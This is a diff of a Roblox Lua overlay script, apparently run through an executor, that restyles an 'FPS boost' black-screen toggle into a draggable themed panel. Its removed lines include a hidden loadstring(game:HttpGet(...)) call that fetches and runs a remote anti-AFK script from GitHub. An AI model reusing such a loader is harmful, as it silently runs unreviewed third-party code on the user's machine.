@@ -39,7 +39,7 @@ local NORMAL_FPS_CAP = 60
 -- ==========================================
 -- STATE MANAGEMENT & GARBAGE GUARDS
 -- ==========================================
-local systemEnabled = true        
+local systemEnabled = false        
 local isInteracting = false
 local currentTaskThread = nil
 
@@ -47,6 +47,7 @@ local screenGui = nil
 local blackFrame = nil
 local toggleButton = nil
 local collapseLine = nil
+local inventoryPanel = nil
 
 local activeConnections = {}
 local hiddenGuis = {}
@@ -250,6 +251,7 @@ local function executeScreenReveal()
 	setThermalEcoRendering(false)
 	setCoreGuiVisible(true)
 	
+	if inventoryPanel then inventoryPanel.Visible = true end
 	toggleButton.Visible = true
 	blackFrame.Visible = false
 	blackFrame.BackgroundTransparency = 1
@@ -260,6 +262,7 @@ local function executeScreenReveal()
 		if not systemEnabled or not blackFrame then return end
 		
 		setCoreGuiVisible(false)
+			if inventoryPanel then inventoryPanel.Visible = false end
 		toggleButton.Visible = false
 		isInteracting = false
 		
@@ -289,28 +292,46 @@ end
 -- ==========================================
 
 local function handleMasterToggle()
+	-- BLACK SCREEN toggle. Keep the control panel visible above the overlay.
 	systemEnabled = not systemEnabled
 	cancelActiveThread()
-	
+	isInteracting = false
+
+	local p = toggleButton and toggleButton.Parent
+	local status = p and p:FindFirstChild("StatusText")
+	local dot = p and p:FindFirstChild("StatusDot")
+
 	if systemEnabled then
-		toggleButton.Text = "FPS BOOST ECO: ON"
-		toggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
-		isInteracting = false
-		setCoreGuiVisible(false)
-		toggleButton.Visible = false
-		playPowerOffAnimation()
+		if status then status.Text = "BLACK SCREEN: ON" end
+		if dot then dot.BackgroundColor3 = Color3.fromRGB(255, 105, 145) end
+
+		-- Apply the performance mode and show the black overlay.
+		setThermalEcoRendering(true)
+
+		if blackFrame then
+			blackFrame.BackgroundTransparency = 0
+			blackFrame.Visible = true
+		end
+
+		-- Keep the ScreenGui and button above the black overlay.
+		if toggleButton then
+			toggleButton.Visible = true
+		end
 	else
-		toggleButton.Text = "FPS BOOST ECO: OFF"
-		toggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-		
-		if collapseLine then collapseLine.Visible = false end
-		blackFrame.Visible = false
-		blackFrame.BackgroundTransparency = 1
-		toggleButton.Visible = true
+		if status then status.Text = "BLACK SCREEN: OFF" end
+		if dot then dot.BackgroundColor3 = Color3.fromRGB(100, 100, 110) end
+
+		-- Restore normal rendering and remove the black overlay.
 		setThermalEcoRendering(false)
-		setCoreGuiVisible(true)
-		isInteracting = false
+
+		if blackFrame then
+			blackFrame.Visible = false
+			blackFrame.BackgroundTransparency = 1
+		end
 	end
+
+	if collapseLine then collapseLine.Visible = false end
+	setCoreGuiVisible(true)
 end
 
 local function purgeMemoryAllocations()
@@ -322,6 +343,7 @@ local function purgeMemoryAllocations()
 		if connection then connection:Disconnect() activeConnections[key] = nil end
 	end
 	
+	if inventoryPanel then inventoryPanel:Destroy() inventoryPanel = nil end
 	if toggleButton then toggleButton:Destroy() toggleButton = nil end
 	if collapseLine then collapseLine:Destroy() collapseLine = nil end
 	if blackFrame then blackFrame:Destroy() blackFrame = nil end
@@ -338,58 +360,301 @@ local function initialize()
 
 	screenGui = Instance.new("ScreenGui")
 	screenGui.Name = "FadeOverlayGui"
-	screenGui.IgnoreGuiInset = true  
-	screenGui.ResetOnSpawn = false   
-	screenGui.DisplayOrder = 999999  
+	screenGui.IgnoreGuiInset = true
+	screenGui.ResetOnSpawn = false
+	screenGui.DisplayOrder = 999999
 
+	-- Hidden overlay used by the existing screen-lock behavior.
 	blackFrame = Instance.new("Frame")
 	blackFrame.Name = "OverlayFrame"
 	blackFrame.Size = UDim2.fromScale(1, 1)
 	blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 	blackFrame.BorderSizePixel = 0
-	blackFrame.Active = true         
+	blackFrame.Active = true
+	blackFrame.Visible = false
+	blackFrame.ZIndex = 9
 	blackFrame.Parent = screenGui
 
 	collapseLine = Instance.new("Frame")
 	collapseLine.Name = "CollapseRay"
-	collapseLine.BackgroundColor3 = Color3.fromRGB(240, 245, 255) 
+	collapseLine.BackgroundColor3 = Color3.fromRGB(240, 245, 255)
 	collapseLine.BorderSizePixel = 0
 	collapseLine.Visible = false
-	collapseLine.ZIndex = 9999999
+	collapseLine.ZIndex = 10
 	collapseLine.Parent = screenGui
 
+	-- Exact visual style based on the reference: dark striped background,
+	-- chunky black outer border, gray inset border and dark inner surface.
+	local panel = Instance.new("Frame")
+	panel.Name = "ReferenceStylePanel"
+	panel.Size = UDim2.new(0.32, 0, 0, 72)
+	panel.Position = UDim2.new(0.02, 0, 0.03, 0)
+	panel.BackgroundColor3 = Color3.fromRGB(68, 30, 43)
+	panel.BorderSizePixel = 0
+	panel.ZIndex = 12
+	panel.Parent = screenGui
+
+	-- Responsive sizing: keeps the same compact look on phones, tablets, and PC.
+	local sizeConstraint = Instance.new("UISizeConstraint")
+	sizeConstraint.MinSize = Vector2.new(135, 58)
+	sizeConstraint.MaxSize = Vector2.new(230, 100)
+	sizeConstraint.Parent = panel
+
+	local aspect = Instance.new("UIAspectRatioConstraint")
+	aspect.AspectRatio = 2.36
+	aspect.DominantAxis = Enum.DominantAxis.Width
+	aspect.Parent = panel
+
+	-- Draggable on mouse and touch devices.
+	panel.Active = true
+	panel.Selectable = true
+	local dragging = false
+	local dragStart = nil
+	local startPosition = nil
+	local dragInput = nil
+
+	local function updatePanelDrag(input)
+		local delta = input.Position - dragStart
+		panel.Position = UDim2.new(
+			startPosition.X.Scale,
+			startPosition.X.Offset + delta.X,
+			startPosition.Y.Scale,
+			startPosition.Y.Offset + delta.Y
+		)
+	end
+
+	panel.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPosition = panel.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	panel.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	activeConnections.PanelDrag = UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging and dragStart and startPosition then
+			updatePanelDrag(input)
+		end
+	end)
+
+	local outerCorner = Instance.new("UICorner")
+	outerCorner.CornerRadius = UDim.new(0, 5)
+	outerCorner.Parent = panel
+
+	local outerStroke = Instance.new("UIStroke")
+	outerStroke.Color = Color3.fromRGB(48, 18, 31)
+	outerStroke.Thickness = 5
+	outerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	outerStroke.Parent = panel
+
+	-- Gray inset frame like the screenshot's item cards.
+	local inset = Instance.new("Frame")
+	inset.Name = "Inset"
+	inset.Position = UDim2.fromOffset(7, 7)
+	inset.Size = UDim2.new(1, -14, 1, -14)
+	inset.BackgroundColor3 = Color3.fromRGB(154, 69, 99)
+	inset.BorderSizePixel = 0
+	inset.ZIndex = 13
+	inset.Parent = panel
+
+	local insetCorner = Instance.new("UICorner")
+	insetCorner.CornerRadius = UDim.new(0, 4)
+	insetCorner.Parent = inset
+
+	local inner = Instance.new("Frame")
+	inner.Name = "Inner"
+	inner.Position = UDim2.fromOffset(3, 3)
+	inner.Size = UDim2.new(1, -6, 1, -6)
+	inner.BackgroundColor3 = Color3.fromRGB(91, 40, 59)
+	inner.BorderSizePixel = 0
+	inner.ZIndex = 14
+	inner.Parent = inset
+
+	local innerCorner = Instance.new("UICorner")
+	innerCorner.CornerRadius = UDim.new(0, 3)
+	innerCorner.Parent = inner
+
+	local pinkGradient = Instance.new("UIGradient")
+	pinkGradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(117, 49, 75)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(78, 31, 52))
+	})
+	pinkGradient.Rotation = 90
+	pinkGradient.Parent = inner
+
+	-- Single control only; no inventory/item slots.
 	toggleButton = Instance.new("TextButton")
 	toggleButton.Name = "MasterToggleButton"
-	toggleButton.Size = UDim2.new(0, 200, 0, 40)
-	toggleButton.Position = UDim2.new(1, -220, 0, 20) 
-	toggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
+	toggleButton.Size = UDim2.fromScale(1, 1)
+	toggleButton.BackgroundTransparency = 1
 	toggleButton.BorderSizePixel = 0
-	toggleButton.Text = "FPS BOOST ECO: ON"
-	toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-	toggleButton.Font = Enum.Font.SourceSansBold
-	toggleButton.TextSize = 14
-	toggleButton.ZIndex = 1000000 
-	toggleButton.Parent = screenGui
+	toggleButton.Text = ""
+	toggleButton.AutoButtonColor = false
+	toggleButton.Active = true
+	toggleButton.ZIndex = 20
+	toggleButton.Parent = inner
 
-	local uiCorner = Instance.new("UICorner")
-	uiCorner.CornerRadius = UDim.new(0, 8)
-	uiCorner.Parent = toggleButton
+	-- Strawberry cake slice icon
+	local cakeIcon = Instance.new("Frame")
+	cakeIcon.Name = "StrawberryCakeIcon"
+	cakeIcon.BackgroundTransparency = 1
+	cakeIcon.Position = UDim2.fromOffset(8, 7)
+	cakeIcon.Size = UDim2.fromOffset(34, 34)
+	cakeIcon.ZIndex = 15
+	cakeIcon.Parent = inner
 
-	activeConnections.Input = UserInputService.InputBegan:Connect(onInputBegan)
+	local cake = Instance.new("Frame")
+	cake.Name = "CakeSlice"
+	cake.AnchorPoint = Vector2.new(0.5, 0.5)
+	cake.Position = UDim2.new(0.5, 0, 0.56, 0)
+	cake.Size = UDim2.fromOffset(28, 19)
+	cake.Rotation = -6
+	cake.BackgroundColor3 = Color3.fromRGB(255, 222, 176)
+	cake.BorderSizePixel = 0
+	cake.ZIndex = 15
+	cake.Parent = cakeIcon
+
+	local cakeCorner = Instance.new("UICorner")
+	cakeCorner.CornerRadius = UDim.new(0, 3)
+	cakeCorner.Parent = cake
+
+	local frosting = Instance.new("Frame")
+	frosting.Name = "PinkFrosting"
+	frosting.Position = UDim2.new(0, 0, 0, 0)
+	frosting.Size = UDim2.new(1, 0, 0, 7)
+	frosting.BackgroundColor3 = Color3.fromRGB(255, 126, 160)
+	frosting.BorderSizePixel = 0
+	frosting.ZIndex = 16
+	frosting.Parent = cake
+
+	local frostingCorner = Instance.new("UICorner")
+	frostingCorner.CornerRadius = UDim.new(0, 3)
+	frostingCorner.Parent = frosting
+
+	local filling = Instance.new("Frame")
+	filling.Name = "StrawberryFilling"
+	filling.Position = UDim2.new(0, 1, 0, 10)
+	filling.Size = UDim2.new(1, -2, 0, 3)
+	filling.BackgroundColor3 = Color3.fromRGB(236, 76, 111)
+	filling.BorderSizePixel = 0
+	filling.ZIndex = 16
+	filling.Parent = cake
+
+	local strawberry = Instance.new("Frame")
+	strawberry.Name = "Strawberry"
+	strawberry.AnchorPoint = Vector2.new(0.5, 0.5)
+	strawberry.Position = UDim2.new(0.48, 0, 0, 0)
+	strawberry.Size = UDim2.fromOffset(10, 10)
+	strawberry.BackgroundColor3 = Color3.fromRGB(240, 62, 79)
+	strawberry.BorderSizePixel = 0
+	strawberry.Rotation = 45
+	strawberry.ZIndex = 18
+	strawberry.Parent = cakeIcon
+
+	local strawberryCorner = Instance.new("UICorner")
+	strawberryCorner.CornerRadius = UDim.new(0, 3)
+	strawberryCorner.Parent = strawberry
+
+	local leaf = Instance.new("Frame")
+	leaf.Name = "Leaf"
+	leaf.AnchorPoint = Vector2.new(0.5, 0.5)
+	leaf.Position = UDim2.new(0.48, 0, 0, -4)
+	leaf.Size = UDim2.fromOffset(8, 4)
+	leaf.BackgroundColor3 = Color3.fromRGB(92, 173, 81)
+	leaf.BorderSizePixel = 0
+	leaf.Rotation = 15
+	leaf.ZIndex = 19
+	leaf.Parent = cakeIcon
+
+	local plate = Instance.new("Frame")
+	plate.Name = "Plate"
+	plate.AnchorPoint = Vector2.new(0.5, 0.5)
+	plate.Position = UDim2.new(0.5, 0, 0.93, 0)
+	plate.Size = UDim2.fromOffset(30, 4)
+	plate.BackgroundColor3 = Color3.fromRGB(225, 229, 232)
+	plate.BorderSizePixel = 0
+	plate.ZIndex = 15
+	plate.Parent = cakeIcon
+
+	local plateCorner = Instance.new("UICorner")
+	plateCorner.CornerRadius = UDim.new(1, 0)
+	plateCorner.Parent = plate
+
+	local title = Instance.new("TextLabel")
+	title.BackgroundTransparency = 1
+	title.Position = UDim2.fromOffset(48, 8)
+	title.Size = UDim2.new(1, -56, 0, 17)
+	title.Font = Enum.Font.GothamBold
+	title.Text = "BLACK SCREEN"
+	title.TextColor3 = Color3.fromRGB(255, 226, 238)
+	title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	title.TextStrokeTransparency = 0.35
+	title.TextSize = 11
+	title.TextXAlignment = Enum.TextXAlignment.Left
+	title.ZIndex = 15
+	title.Parent = inner
+
+	local status = Instance.new("TextLabel")
+	status.Name = "StatusText"
+	status.BackgroundTransparency = 1
+	status.Position = UDim2.fromOffset(48, 28)
+	status.Size = UDim2.new(1, -56, 0, 13)
+	status.Font = Enum.Font.GothamBold
+	status.Text = "BLACK SCREEN: ON"
+	status.TextColor3 = Color3.fromRGB(255, 181, 205)
+	status.TextSize = 8
+	status.TextXAlignment = Enum.TextXAlignment.Left
+	status.ZIndex = 15
+	status.Parent = inner
+
+	local statusDot = Instance.new("Frame")
+	statusDot.Name = "StatusDot"
+	statusDot.Size = UDim2.fromOffset(7, 7)
+	statusDot.Position = UDim2.new(1, -15, 1, -15)
+	statusDot.BackgroundColor3 = Color3.fromRGB(80, 220, 120)
+	statusDot.BorderSizePixel = 0
+	statusDot.ZIndex = 16
+	statusDot.Parent = inner
+
+	local dotCorner = Instance.new("UICorner")
+	dotCorner.CornerRadius = UDim.new(1, 0)
+	dotCorner.Parent = statusDot
+
+	-- Always start with Black Screen OFF.
+	status.Text = "BLACK SCREEN: OFF"
+	statusDot.BackgroundColor3 = Color3.fromRGB(100, 100, 110)
+	blackFrame.Visible = false
+	blackFrame.BackgroundTransparency = 1
+
+	-- Keep references so the existing toggle function can update the visual.
 	activeConnections.ToggleClick = toggleButton.MouseButton1Click:Connect(handleMasterToggle)
 	activeConnections.GuiDestroy = screenGui.Destroying:Connect(purgeMemoryAllocations)
 
 	screenGui.Parent = playerGui
-	
-	setCoreGuiVisible(false)
-	toggleButton.Visible = false 
-	playPowerOffAnimation()
-
-	task.defer(function()
-		local status, message = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
-		end)
-	end)
+	screenGui.Enabled = true
+	systemEnabled = false
+	if blackFrame then
+		blackFrame.Visible = false
+		blackFrame.BackgroundTransparency = 1
+	end
+	setCoreGuiVisible(true)
+	panel.Visible = true
+	toggleButton.Visible = true
+	blackFrame.Visible = false
+	blackFrame.BackgroundTransparency = 1
 end
-
 initialize()
